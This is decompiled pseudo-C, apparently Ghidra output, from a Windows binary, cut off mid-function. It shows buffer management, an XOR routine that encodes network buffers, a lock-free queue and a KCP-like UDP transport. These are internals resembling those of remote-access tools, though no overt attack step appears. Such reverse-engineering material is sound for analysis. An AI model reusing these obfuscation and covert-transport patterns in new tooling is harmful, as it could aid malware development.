/* Function: FUN_00401000 */

undefined4 * __thiscall FUN_00401000(void *this,byte param_1)

{
  *(undefined ***)this = CBuffer::vftable;
  if (*(LPVOID *)((int)this + 4) != (LPVOID)0x0) {
    VirtualFree(*(LPVOID *)((int)this + 4),0,0x8000);
  }
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (undefined4 *)this;
}



/* Function: FUN_00401040 */

void __fastcall FUN_00401040(undefined4 *param_1)

{
  *param_1 = CBuffer::vftable;
  if ((LPVOID)param_1[1] != (LPVOID)0x0) {
    VirtualFree((LPVOID)param_1[1],0,0x8000);
  }
  return;
}



/* Function: FUN_00401060 */

size_t FUN_00401060(void *param_1,size_t param_2,int param_3,int param_4)

{
  byte *pbVar1;
  byte *pbVar2;
  int in_EAX;
  uint uVar3;
  
  FUN_00401100();
  FID_conflict__memcpy(*(void **)(in_EAX + 8),param_1,param_2);
  if (param_3 != 0) {
    uVar3 = 0;
    param_1 = (void *)0x0;
    if (0 < (int)param_2) {
      do {
        pbVar1 = (byte *)(uVar3 + *(int *)(in_EAX + 8));
        pbVar2 = (byte *)((int)param_1 + param_4);
        param_1 = (void *)((int)param_1 + 1);
        *pbVar1 = *pbVar1 ^ (char)((ulonglong)*pbVar2 % 0x1c8) + 0x36U;
        if (uVar3 % 10 == 0) {
          param_1 = (void *)0x0;
        }
        uVar3 = uVar3 + 1;
      } while ((int)uVar3 < (int)param_2);
      *(int *)(in_EAX + 8) = *(int *)(in_EAX + 8) + param_2;
      return param_2;
    }
  }
  *(int *)(in_EAX + 8) = *(int *)(in_EAX + 8) + param_2;
  return param_2;
}



/* Function: FUN_00401100 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

SIZE_T FUN_00401100(void)

{
  void *_Src;
  double dVar1;
  uint in_EAX;
  LPVOID _Dst;
  size_t _Size;
  int unaff_ESI;
  SIZE_T dwSize;
  float10 fVar2;
  undefined4 local_10;
  
  if (in_EAX < *(uint *)(unaff_ESI + 0xc)) {
    return 0;
  }
  dVar1 = (double)(int)in_EAX;
  if ((int)in_EAX < 0) {
    dVar1 = dVar1 + _DAT_00417778;
  }
  fVar2 = FUN_00406d60(dVar1 * _PTR_00417770);
  local_10 = (int)(longlong)ROUND(fVar2);
  dwSize = local_10 << 10;
  _Dst = VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
  _Src = *(void **)(unaff_ESI + 4);
  if (_Src == (void *)0x0) {
    _Size = 0;
  }
  else {
    _Size = *(int *)(unaff_ESI + 8) - (int)_Src;
  }
  FID_conflict__memcpy(_Dst,_Src,_Size);
  if (*(LPVOID *)(unaff_ESI + 4) != (LPVOID)0x0) {
    VirtualFree(*(LPVOID *)(unaff_ESI + 4),0,0x8000);
  }
  *(LPVOID *)(unaff_ESI + 4) = _Dst;
  *(SIZE_T *)(unaff_ESI + 0xc) = dwSize;
  *(size_t *)(unaff_ESI + 8) = _Size + (int)_Dst;
  return dwSize;
}



/* Function: FUN_004011b0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

uint __fastcall FUN_004011b0(undefined4 param_1,uint param_2)

{
  void *_Src;
  double dVar1;
  LPVOID _Dst;
  size_t _Size;
  int unaff_ESI;
  uint dwSize;
  float10 fVar2;
  undefined4 local_10;
  
  if ((*(int *)(unaff_ESI + 4) != 0) &&
     (param_2 < (uint)(*(int *)(unaff_ESI + 8) - *(int *)(unaff_ESI + 4)))) {
    return 0;
  }
  dVar1 = (double)(int)param_2;
  if ((int)param_2 < 0) {
    dVar1 = dVar1 + _DAT_00417778;
  }
  fVar2 = FUN_00406d60(dVar1 * _PTR_00417770);
  local_10 = (int)(longlong)ROUND(fVar2);
  dwSize = local_10 << 10;
  if (dwSize < *(uint *)(unaff_ESI + 0xc)) {
    return 0;
  }
  _Dst = VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
  _Src = *(void **)(unaff_ESI + 4);
  if (_Src == (void *)0x0) {
    _Size = 0;
  }
  else {
    _Size = *(int *)(unaff_ESI + 8) - (int)_Src;
  }
  FID_conflict__memcpy(_Dst,_Src,_Size);
  VirtualFree(*(LPVOID *)(unaff_ESI + 4),0,0x8000);
  *(size_t *)(unaff_ESI + 8) = _Size + (int)_Dst;
  *(LPVOID *)(unaff_ESI + 4) = _Dst;
  *(uint *)(unaff_ESI + 0xc) = dwSize;
  return dwSize;
}



/* Function: FUN_00401280 */

void FUN_00401280(void)

{
  code *pcVar1;
  undefined1 local_8 [4];
  
  __CxxThrowException_8(local_8,&DAT_00417e78);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_004012a0 */

void FUN_004012a0(void)

{
  LPCRITICAL_SECTION in_EAX;
  
  DeleteCriticalSection(in_EAX);
  return;
}



/* Function: FUN_004012c0 */

exception * __thiscall FUN_004012c0(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  FUN_00406fb2((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_004069ca(this);
  }
  return (exception *)this;
}



/* Function: thunk_FUN_00401350 */

void thunk_FUN_00401350(void)

{
  undefined4 *lpMem;
  int iVar1;
  int *unaff_ESI;
  
  if (*unaff_ESI < 1) {
    return;
  }
  while( true ) {
    lpMem = (undefined4 *)unaff_ESI[1];
    if (lpMem == (undefined4 *)unaff_ESI[2]) {
      if (lpMem == (undefined4 *)0x0) {
        return;
      }
      unaff_ESI[1] = 0;
      unaff_ESI[2] = 0;
    }
    else {
      iVar1 = lpMem[1];
      unaff_ESI[1] = iVar1;
      *(undefined4 *)(iVar1 + 8) = 0;
    }
    if (lpMem == (undefined4 *)0x0) break;
    lpMem[1] = 0;
    lpMem[2] = 0;
    *unaff_ESI = *unaff_ESI + -1;
    HeapFree(*(HANDLE *)*lpMem,0,lpMem);
  }
  return;
}



/* Function: FUN_00401300 */

size_t FUN_00401300(void *param_1)

{
  size_t in_EAX;
  size_t sVar1;
  int unaff_ESI;
  
  sVar1 = (*(int *)(unaff_ESI + 0x10) + *(int *)(unaff_ESI + 0xc)) -
          (int)*(void **)(unaff_ESI + 0x18);
  if ((int)sVar1 < (int)in_EAX) {
    in_EAX = sVar1;
  }
  if (0 < (int)in_EAX) {
    FID_conflict__memcpy(*(void **)(unaff_ESI + 0x18),param_1,in_EAX);
    *(int *)(unaff_ESI + 0x18) = *(int *)(unaff_ESI + 0x18) + in_EAX;
  }
  return in_EAX;
}



/* Function: FUN_00401340 */

void FUN_00401340(void)

{
  undefined4 *in_EAX;
  
  LeaveCriticalSection((LPCRITICAL_SECTION)*in_EAX);
  return;
}



/* Function: FUN_00401350 */

void FUN_00401350(void)

{
  undefined4 *lpMem;
  int iVar1;
  int *unaff_ESI;
  
  if (*unaff_ESI < 1) {
    return;
  }
  while( true ) {
    lpMem = (undefined4 *)unaff_ESI[1];
    if (lpMem == (undefined4 *)unaff_ESI[2]) {
      if (lpMem == (undefined4 *)0x0) {
        return;
      }
      unaff_ESI[1] = 0;
      unaff_ESI[2] = 0;
    }
    else {
      iVar1 = lpMem[1];
      unaff_ESI[1] = iVar1;
      *(undefined4 *)(iVar1 + 8) = 0;
    }
    if (lpMem == (undefined4 *)0x0) break;
    lpMem[1] = 0;
    lpMem[2] = 0;
    *unaff_ESI = *unaff_ESI + -1;
    HeapFree(*(HANDLE *)*lpMem,0,lpMem);
  }
  return;
}



/* Function: FUN_004013a0 */

void FUN_004013a0(void)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *in_EAX;
  int iVar3;
  undefined4 *local_8;
  
  local_8 = (undefined4 *)0x0;
  iVar3 = FUN_00401520(in_EAX + 7,(uint *)&local_8);
  if (iVar3 == 0) {
    iVar3 = in_EAX[4];
    local_8 = (undefined4 *)HeapAlloc((HANDLE)*in_EAX,0,iVar3 + 0x1c);
    puVar1 = local_8 + 7;
    local_8[3] = iVar3;
    *local_8 = in_EAX;
    local_8[1] = 0;
    local_8[2] = 0;
    local_8[4] = puVar1;
    local_8[5] = puVar1;
    local_8[6] = puVar1;
  }
  uVar2 = local_8[3];
  local_8[5] = ((0 < (int)uVar2) - 1 & uVar2) + local_8[4];
  local_8[6] = local_8[4] + (uVar2 & (0 < (int)uVar2) - 1);
  return;
}



/* Function: FUN_00401420 */

void FUN_00401420(void)

{
  undefined4 *puVar1;
  undefined4 *lpMem;
  uint uVar2;
  uint *unaff_ESI;
  
  uVar2 = 0;
  if (*unaff_ESI != 0) {
    do {
      puVar1 = (undefined4 *)(unaff_ESI[1] + uVar2 * 4);
      lpMem = (undefined4 *)*puVar1;
      if ((undefined4 *)0xf < lpMem) {
        HeapFree(*(HANDLE *)*lpMem,0,lpMem);
        *puVar1 = 0;
      }
      uVar2 = uVar2 + 1;
    } while (uVar2 < *unaff_ESI);
  }
  if ((void *)unaff_ESI[1] != (void *)0x0) {
    _free((void *)unaff_ESI[1]);
    unaff_ESI[1] = 0;
    *unaff_ESI = 0;
    unaff_ESI[0x11] = 0;
    unaff_ESI[0x21] = 0;
  }
  return;
}



/* Function: FUN_00401480 */

undefined4 FUN_00401480(LONG param_1)

{
  uint *Destination;
  uint Comperand;
  LONG LVar1;
  uint uVar2;
  uint *unaff_EDI;
  uint local_8;
  
  if (unaff_EDI[1] == 0) {
    return 0;
  }
  local_8 = 0;
  if (*unaff_EDI != 0) {
    Destination = unaff_EDI + 0x11;
    while( true ) {
      Comperand = *Destination;
      if ((int)*unaff_EDI <= (int)(Comperand - unaff_EDI[0x21])) break;
      uVar2 = Comperand % *unaff_EDI;
      if ((*(int *)(unaff_EDI[1] + uVar2 * 4) == 0) &&
         (LVar1 = InterlockedCompareExchange((LONG *)(unaff_EDI[1] + uVar2 * 4),param_1,0),
         LVar1 == 0)) {
        InterlockedCompareExchange((LONG *)Destination,Comperand + 1,Comperand);
        return 1;
      }
      InterlockedCompareExchange((LONG *)Destination,Comperand + 1,Comperand);
      local_8 = local_8 + 1;
      if (*unaff_EDI <= local_8) {
        return 0;
      }
    }
  }
  return 0;
}



/* Function: FUN_00401520 */

undefined4 FUN_00401520(uint *param_1,uint *param_2)

{
  uint *Destination;
  uint Comperand;
  uint uVar1;
  uint Comperand_00;
  undefined4 local_8;
  
  if (param_1[1] == 0) {
    return 0;
  }
  Destination = param_1 + 0x21;
  Comperand_00 = *Destination;
  local_8 = 0;
  if (param_1[0x11] != Comperand_00 && -1 < (int)(param_1[0x11] - Comperand_00)) {
    while( true ) {
      Comperand = *(uint *)(param_1[1] + (Comperand_00 % *param_1) * 4);
      if ((0xf < Comperand) &&
         (uVar1 = InterlockedCompareExchange
                            ((LONG *)(param_1[1] + (Comperand_00 % *param_1) * 4),0,Comperand),
         uVar1 == Comperand)) break;
      InterlockedCompareExchange((LONG *)Destination,Comperand_00 + 1,Comperand_00);
      Comperand_00 = *Destination;
      if (param_1[0x11] == Comperand_00 || (int)(param_1[0x11] - Comperand_00) < 0) {
        return 0;
      }
    }
    InterlockedCompareExchange((LONG *)Destination,Comperand_00 + 1,Comperand_00);
    *param_2 = Comperand;
    local_8 = 1;
  }
  return local_8;
}



/* Function: FUN_004015d0 */

exception * __thiscall FUN_004015d0(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (exception *)this;
}



/* Function: FUN_004015f0 */

void __fastcall FUN_004015f0(void *param_1)

{
  if (DAT_0041bd8c != (code *)0x0) {
    (*DAT_0041bd8c)();
    return;
  }
  _free(param_1);
  return;
}



/* Function: FUN_00401610 */

void __cdecl FUN_00401610(uint param_1,char *param_2)

{
  int unaff_ESI;
  char local_408 [1024];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  if (((*(uint *)(unaff_ESI + 200) & param_1) != 0) && (*(int *)(unaff_ESI + 0xd0) != 0)) {
    _vsprintf(local_408,param_2,&stack0x0000000c);
    (**(code **)(unaff_ESI + 0xd0))(local_408);
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: FUN_00401680 */

undefined4 __fastcall FUN_00401680(uint param_1)

{
  int in_EAX;
  
  if (((*(uint *)(in_EAX + 200) & param_1) != 0) && (*(int *)(in_EAX + 0xd0) != 0)) {
    return 1;
  }
  return 0;
}



/* Function: FUN_004016a0 */

undefined4 * __cdecl FUN_004016a0(undefined4 param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  undefined4 *_Memory;
  void *pvVar2;
  code *pcVar3;
  
  pcVar3 = DAT_0041bd88;
  if (DAT_0041bd88 == (code *)0x0) {
    _Memory = (undefined4 *)_malloc(0xd4);
  }
  else {
    _Memory = (undefined4 *)(*DAT_0041bd88)();
    pcVar3 = DAT_0041bd88;
  }
  if (_Memory != (undefined4 *)0x0) {
    *_Memory = param_1;
    _Memory[0x2c] = param_2;
    _Memory[4] = 0;
    _Memory[5] = 0;
    _Memory[6] = 0;
    _Memory[7] = 0;
    _Memory[8] = 0;
    _Memory[0x1d] = 0;
    _Memory[0x1e] = 0;
    _Memory[0xe] = 0x20;
    _Memory[0xf] = 0x80;
    _Memory[0x10] = 0x80;
    _Memory[0x11] = 0;
    _Memory[0x20] = 0;
    _Memory[0x12] = 0;
    _Memory[1] = 0x578;
    _Memory[2] = 0x560;
    _Memory[0x31] = 0;
    if (pcVar3 == (code *)0x0) {
      pvVar2 = _malloc(0x10b0);
    }
    else {
      pvVar2 = (void *)(*pcVar3)();
    }
    _Memory[0x2d] = pvVar2;
    if (pvVar2 != (void *)0x0) {
      puVar1 = _Memory + 0x21;
      _Memory[0x22] = puVar1;
      *puVar1 = puVar1;
      puVar1 = _Memory + 0x23;
      _Memory[0x24] = puVar1;
      *puVar1 = puVar1;
      puVar1 = _Memory + 0x25;
      _Memory[0x26] = puVar1;
      *puVar1 = puVar1;
      puVar1 = _Memory + 0x27;
      _Memory[0x28] = puVar1;
      *puVar1 = puVar1;
      _Memory[0x17] = 0;
      _Memory[0x18] = 0;
      _Memory[0x19] = 0;
      _Memory[0x1a] = 0;
      _Memory[3] = 0;
      _Memory[0x29] = 0;
      _Memory[0x2b] = 0;
      _Memory[0x2a] = 0;
      _Memory[0xb] = 0;
      _Memory[10] = 0;
      _Memory[0x13] = 0;
      _Memory[0x1b] = 0;
      _Memory[0x1c] = 0;
      _Memory[0x32] = 0;
      _Memory[0x2e] = 0;
      _Memory[0x30] = 0;
      _Memory[0x16] = 0;
      _Memory[0x33] = 0;
      _Memory[0x34] = 0;
      _Memory[0xd] = 100;
      _Memory[0x14] = 100;
      _Memory[0x15] = 100;
      _Memory[0xc] = 200;
      _Memory[9] = 2;
      _Memory[0x2f] = 5;
      _Memory[0x1f] = 0x14;
      return _Memory;
    }
    if (DAT_0041bd8c != (code *)0x0) {
      (*DAT_0041bd8c)();
      return (undefined4 *)0x0;
    }
    _free(_Memory);
  }
  return (undefined4 *)0x0;
}



/* Function: FUN_00401830 */

void __cdecl FUN_00401830(void *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int *piVar3;
  code *pcVar4;
  
  if (param_1 != (void *)0x0) {
    puVar1 = (undefined4 *)((int)param_1 + 0x94);
    puVar2 = (undefined4 *)*puVar1;
    pcVar4 = DAT_0041bd8c;
    while (puVar1 != puVar2) {
      piVar3 = (int *)*puVar1;
      *(int *)(*piVar3 + 4) = piVar3[1];
      *(int *)piVar3[1] = *piVar3;
      *piVar3 = 0;
      piVar3[1] = 0;
      if (pcVar4 == (code *)0x0) {
        _free(piVar3);
        pcVar4 = (code *)0x0;
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
      puVar2 = (undefined4 *)*puVar1;
    }
    puVar1 = (undefined4 *)((int)param_1 + 0x9c);
    puVar2 = (undefined4 *)*puVar1;
    while (puVar1 != puVar2) {
      piVar3 = (int *)*puVar1;
      *(int *)(*piVar3 + 4) = piVar3[1];
      *(int *)piVar3[1] = *piVar3;
      *piVar3 = 0;
      piVar3[1] = 0;
      if (pcVar4 == (code *)0x0) {
        _free(piVar3);
        pcVar4 = (code *)0x0;
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
      puVar2 = (undefined4 *)*puVar1;
    }
    puVar1 = (undefined4 *)((int)param_1 + 0x84);
    puVar2 = (undefined4 *)*puVar1;
    while (puVar1 != puVar2) {
      piVar3 = (int *)*puVar1;
      *(int *)(*piVar3 + 4) = piVar3[1];
      *(int *)piVar3[1] = *piVar3;
      *piVar3 = 0;
      piVar3[1] = 0;
      if (pcVar4 == (code *)0x0) {
        _free(piVar3);
        pcVar4 = (code *)0x0;
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
      puVar2 = (undefined4 *)*puVar1;
    }
    puVar1 = (undefined4 *)((int)param_1 + 0x8c);
    puVar2 = (undefined4 *)*puVar1;
    while (puVar1 != puVar2) {
      piVar3 = (int *)*puVar1;
      *(int *)(*piVar3 + 4) = piVar3[1];
      *(int *)piVar3[1] = *piVar3;
      *piVar3 = 0;
      piVar3[1] = 0;
      if (pcVar4 == (code *)0x0) {
        _free(piVar3);
        pcVar4 = (code *)0x0;
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
      puVar2 = (undefined4 *)*puVar1;
    }
    if (*(void **)((int)param_1 + 0xb4) != (void *)0x0) {
      if (pcVar4 == (code *)0x0) {
        _free(*(void **)((int)param_1 + 0xb4));
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
    }
    if (*(void **)((int)param_1 + 0xa4) != (void *)0x0) {
      if (pcVar4 == (code *)0x0) {
        _free(*(void **)((int)param_1 + 0xa4));
      }
      else {
        (*pcVar4)();
        pcVar4 = DAT_0041bd8c;
      }
    }
    *(undefined4 *)((int)param_1 + 0x5c) = 0;
    *(undefined4 *)((int)param_1 + 0x60) = 0;
    *(undefined4 *)((int)param_1 + 100) = 0;
    *(undefined4 *)((int)param_1 + 0x68) = 0;
    *(undefined4 *)((int)param_1 + 0xa8) = 0;
    *(undefined4 *)((int)param_1 + 0xb4) = 0;
    *(undefined4 *)((int)param_1 + 0xa4) = 0;
    if (pcVar4 != (code *)0x0) {
      (*pcVar4)();
      return;
    }
    _free(param_1);
  }
  return;
}



/* Function: FUN_004019d0 */

int __cdecl FUN_004019d0(void *param_1,int param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 *puVar3;
  uint uVar4;
  code *pcVar5;
  int in_EAX;
  int *piVar6;
  int iVar7;
  uint extraout_ECX;
  int iVar8;
  int *piVar9;
  bool bVar10;
  
  piVar9 = *(int **)(in_EAX + 0x8c);
  iVar8 = 0;
  bVar10 = -1 < param_2;
  if ((int *)(in_EAX + 0x8c) == piVar9) {
    return -1;
  }
  if (param_2 < 0) {
    param_2 = -param_2;
  }
  if (piVar9[4] == 0) {
    iVar8 = piVar9[9];
  }
  else {
    piVar6 = piVar9;
    if (*(uint *)(in_EAX + 100) < piVar9[4] + 1U) {
      return -2;
    }
    do {
      iVar8 = iVar8 + piVar6[9];
      if (piVar6[4] == 0) break;
      piVar6 = (int *)*piVar6;
    } while (piVar6 != (int *)(in_EAX + 0x8c));
  }
  if (iVar8 < 0) {
    return -2;
  }
  if (param_2 < iVar8) {
    return -3;
  }
  uVar4 = *(uint *)(in_EAX + 100);
  uVar2 = *(uint *)(in_EAX + 0x3c);
  param_2 = 0;
  do {
    piVar6 = (int *)*piVar9;
    if (param_1 != (void *)0x0) {
      FID_conflict__memcpy(param_1,piVar9 + 0xe,piVar9[9]);
      param_1 = (void *)((int)param_1 + piVar9[9]);
    }
    param_2 = param_2 + piVar9[9];
    iVar8 = piVar9[4];
    iVar7 = FUN_00401680(8);
    if (iVar7 != 0) {
      FUN_00401610(extraout_ECX,"recv sn=%lu");
    }
    if (bVar10) {
      *(int *)(*piVar9 + 4) = piVar9[1];
      *(int *)piVar9[1] = *piVar9;
      pcVar5 = DAT_0041bd8c;
      *piVar9 = 0;
      piVar9[1] = 0;
      if (pcVar5 == (code *)0x0) {
        _free(piVar9);
      }
      else {
        (*pcVar5)();
      }
      *(int *)(in_EAX + 100) = *(int *)(in_EAX + 100) + -1;
    }
  } while ((iVar8 != 0) && (piVar9 = piVar6, piVar6 != (int *)(in_EAX + 0x8c)));
  puVar1 = (undefined4 *)(in_EAX + 0x9c);
  puVar3 = (undefined4 *)*puVar1;
  while (((puVar1 != puVar3 && (piVar9 = (int *)*puVar1, piVar9[7] == *(int *)(in_EAX + 0x18))) &&
         (*(uint *)(in_EAX + 100) < *(uint *)(in_EAX + 0x3c)))) {
    *(int *)(*piVar9 + 4) = piVar9[1];
    *(int *)piVar9[1] = *piVar9;
    *piVar9 = 0;
    piVar9[1] = 0;
    *(int *)(in_EAX + 0x5c) = *(int *)(in_EAX + 0x5c) + -1;
    piVar9[1] = *(int *)(in_EAX + 0x90);
    *piVar9 = in_EAX + 0x8c;
    **(undefined4 **)(in_EAX + 0x90) = piVar9;
    *(int **)(in_EAX + 0x90) = piVar9;
    *(int *)(in_EAX + 100) = *(int *)(in_EAX + 100) + 1;
    *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + 1;
    puVar3 = (undefined4 *)*puVar1;
  }
  if ((*(uint *)(in_EAX + 100) < *(uint *)(in_EAX + 0x3c)) && (uVar2 <= uVar4)) {
    *(uint *)(in_EAX + 0x48) = *(uint *)(in_EAX + 0x48) | 2;
  }
  return param_2;
}



/* Function: FUN_00401b90 */

undefined4 __cdecl FUN_00401b90(void *param_1,size_t param_2)

{
  uint uVar1;
  int iVar2;
  size_t sVar3;
  int *piVar4;
  int *piVar5;
  int unaff_EDI;
  int local_10;
  uint local_c;
  uint local_8;
  
  if ((int)param_2 < 0) {
    return 0xffffffff;
  }
  if (*(int *)(unaff_EDI + 0xc4) != 0) {
    if ((int *)(unaff_EDI + 0x84) != *(int **)(unaff_EDI + 0x84)) {
      piVar5 = *(int **)(unaff_EDI + 0x88);
      uVar1 = piVar5[9];
      if (uVar1 < *(uint *)(unaff_EDI + 8)) {
        sVar3 = *(uint *)(unaff_EDI + 8) - uVar1;
        local_8 = param_2;
        if ((int)sVar3 <= (int)param_2) {
          local_8 = sVar3;
        }
        if (DAT_0041bd88 == (code *)0x0) {
          piVar4 = (int *)_malloc(uVar1 + 0x3c + local_8);
        }
        else {
          piVar4 = (int *)(*DAT_0041bd88)();
        }
        if (piVar4 == (int *)0x0) {
          return 0xfffffffe;
        }
        piVar4[1] = *(int *)(unaff_EDI + 0x88);
        *piVar4 = unaff_EDI + 0x84;
        **(undefined4 **)(unaff_EDI + 0x88) = piVar4;
        *(int **)(unaff_EDI + 0x88) = piVar4;
        FID_conflict__memcpy(piVar4 + 0xe,piVar5 + 0xe,piVar5[9]);
        if (param_1 != (void *)0x0) {
          FID_conflict__memcpy((void *)((int)piVar4 + piVar5[9] + 0x38),param_1,local_8);
          param_1 = (void *)((int)param_1 + local_8);
        }
        iVar2 = piVar5[9];
        param_2 = param_2 - local_8;
        piVar4[4] = 0;
        piVar4[9] = iVar2 + local_8;
        *(int *)(*piVar5 + 4) = piVar5[1];
        *(int *)piVar5[1] = *piVar5;
        *piVar5 = (int)piVar5;
        piVar5[1] = (int)piVar5;
        FUN_004015f0(piVar5);
      }
    }
    if ((int)param_2 < 1) {
      return 0;
    }
  }
  local_8 = *(uint *)(unaff_EDI + 8);
  if ((int)local_8 < (int)param_2) {
    local_8 = ((local_8 - 1) + param_2) / local_8;
    if (0x7f < (int)local_8) {
      return 0xfffffffe;
    }
    if (local_8 != 0) goto LAB_00401cc3;
  }
  local_8 = 1;
LAB_00401cc3:
  local_10 = 0;
  local_c = local_8;
  if (0 < (int)local_8) {
    do {
      local_c = local_c - 1;
      sVar3 = *(size_t *)(unaff_EDI + 8);
      if ((int)param_2 <= (int)*(size_t *)(unaff_EDI + 8)) {
        sVar3 = param_2;
      }
      if (DAT_0041bd88 == (code *)0x0) {
        piVar5 = (int *)_malloc(sVar3 + 0x3c);
      }
      else {
        piVar5 = (int *)(*DAT_0041bd88)();
      }
      if (piVar5 == (int *)0x0) {
        return 0xfffffffe;
      }
      if ((param_1 != (void *)0x0) && (0 < (int)param_2)) {
        FID_conflict__memcpy(piVar5 + 0xe,param_1,sVar3);
      }
      piVar5[9] = sVar3;
      iVar2 = *(int *)(unaff_EDI + 0xc4);
      *piVar5 = (int)piVar5;
      piVar5[4] = ~-(uint)(iVar2 != 0) & local_c;
      piVar5[1] = (int)piVar5;
      piVar5[1] = *(int *)(unaff_EDI + 0x88);
      *piVar5 = unaff_EDI + 0x84;
      **(undefined4 **)(unaff_EDI + 0x88) = piVar5;
      *(int *)(unaff_EDI + 0x68) = *(int *)(unaff_EDI + 0x68) + 1;
      *(int **)(unaff_EDI + 0x88) = piVar5;
      if (param_1 != (void *)0x0) {
        param_1 = (void *)((int)param_1 + sVar3);
      }
      param_2 = param_2 - sVar3;
      local_10 = local_10 + 1;
    } while (local_10 < (int)local_8);
  }
  return 0;
}



/* Function: FUN_00401db0 */

void __fastcall FUN_00401db0(int param_1)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int unaff_EDI;
  
  iVar3 = *(int *)(param_1 + 0x2c);
  if (iVar3 == 0) {
    *(int *)(param_1 + 0x2c) = unaff_EDI;
    *(int *)(param_1 + 0x28) = unaff_EDI / 2;
  }
  else {
    iVar2 = unaff_EDI - iVar3;
    if (iVar2 < 0) {
      iVar2 = -iVar2;
    }
    iVar2 = iVar2 + *(int *)(param_1 + 0x28) * 3;
    *(int *)(param_1 + 0x28) = (int)(iVar2 + (iVar2 >> 0x1f & 3U)) >> 2;
    iVar3 = iVar3 * 7 + unaff_EDI;
    iVar3 = (int)(iVar3 + (iVar3 >> 0x1f & 7U)) >> 3;
    *(int *)(param_1 + 0x2c) = iVar3;
    if (iVar3 < 1) {
      *(undefined4 *)(param_1 + 0x2c) = 1;
    }
  }
  uVar1 = *(int *)(param_1 + 0x28) * 4;
  uVar4 = *(uint *)(param_1 + 0x50);
  if (*(uint *)(param_1 + 0x50) < uVar1) {
    uVar4 = uVar1;
  }
  uVar4 = *(int *)(param_1 + 0x2c) + uVar4;
  if (uVar4 <= *(uint *)(param_1 + 0x34)) {
    uVar4 = *(uint *)(param_1 + 0x34);
  }
  if (60000 < uVar4) {
    uVar4 = 60000;
  }
  *(uint *)(param_1 + 0x30) = uVar4;
  return;
}



/* Function: FUN_00401e40 */

void __fastcall FUN_00401e40(undefined4 param_1,int param_2)

{
  code *pcVar1;
  int *_Memory;
  int unaff_EDI;
  
  if ((-1 < param_2 - *(int *)(unaff_EDI + 0x10)) && (param_2 - *(int *)(unaff_EDI + 0x14) < 0)) {
    _Memory = *(int **)(unaff_EDI + 0x94);
    if (_Memory != (int *)(unaff_EDI + 0x94)) {
      while (param_2 != _Memory[7]) {
        if (param_2 - _Memory[7] < 0) {
          return;
        }
        _Memory = (int *)*_Memory;
        if (_Memory == (int *)(unaff_EDI + 0x94)) {
          return;
        }
      }
      *(int *)(*_Memory + 4) = _Memory[1];
      *(int *)_Memory[1] = *_Memory;
      pcVar1 = DAT_0041bd8c;
      *_Memory = 0;
      _Memory[1] = 0;
      if (pcVar1 != (code *)0x0) {
        (*pcVar1)();
        *(int *)(unaff_EDI + 0x60) = *(int *)(unaff_EDI + 0x60) + -1;
        return;
      }
      _free(_Memory);
      *(int *)(unaff_EDI + 0x60) = *(int *)(unaff_EDI + 0x60) + -1;
    }
  }
  return;
}



/* Function: FUN_00401ec0 */

void __cdecl FUN_00401ec0(int param_1)

{
  undefined4 *puVar1;
  undefined4 *_Memory;
  code *pcVar2;
  int unaff_EDI;
  
  _Memory = *(undefined4 **)(unaff_EDI + 0x94);
  while ((_Memory != (undefined4 *)(unaff_EDI + 0x94) &&
         (puVar1 = (undefined4 *)*_Memory, param_1 != _Memory[7] && -1 < param_1 - _Memory[7]))) {
    puVar1[1] = _Memory[1];
    *(undefined4 *)_Memory[1] = *_Memory;
    pcVar2 = DAT_0041bd8c;
    *_Memory = 0;
    _Memory[1] = 0;
    if (pcVar2 == (code *)0x0) {
      _free(_Memory);
    }
    else {
      (*pcVar2)();
    }
    *(int *)(unaff_EDI + 0x60) = *(int *)(unaff_EDI + 0x60) + -1;
    _Memory = puVar1;
  }
  return;
}



/* Function: FUN_00401f20 */

void FUN_00401f20(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int in_EAX;
  int unaff_ESI;
  
  if ((-1 < unaff_ESI - *(int *)(in_EAX + 0x10)) && (unaff_ESI - *(int *)(in_EAX + 0x14) < 0)) {
    puVar2 = *(undefined4 **)(in_EAX + 0x94);
    while (puVar1 = puVar2, puVar1 != (undefined4 *)(in_EAX + 0x94)) {
      if (unaff_ESI - puVar1[7] < 0) {
        return;
      }
      puVar2 = (undefined4 *)*puVar1;
      if (unaff_ESI != puVar1[7]) {
        puVar1[0xc] = puVar1[0xc] + 1;
      }
    }
  }
  return;
}



/* Function: FUN_00401f60 */

void __cdecl FUN_00401f60(undefined4 param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvVar3;
  uint uVar4;
  int unaff_ESI;
  
  uVar2 = *(int *)(unaff_ESI + 0xa8) + 1;
  if (*(uint *)(unaff_ESI + 0xac) < uVar2) {
    uVar4 = 8;
    if (8 < uVar2) {
      do {
        uVar4 = uVar4 * 2;
      } while (uVar4 < uVar2);
    }
    if (DAT_0041bd88 == (code *)0x0) {
      pvVar3 = _malloc(uVar4 * 8);
    }
    else {
      pvVar3 = (void *)(*DAT_0041bd88)();
    }
    if (pvVar3 == (void *)0x0) {
                    /* WARNING: Subroutine does not return */
      _abort();
    }
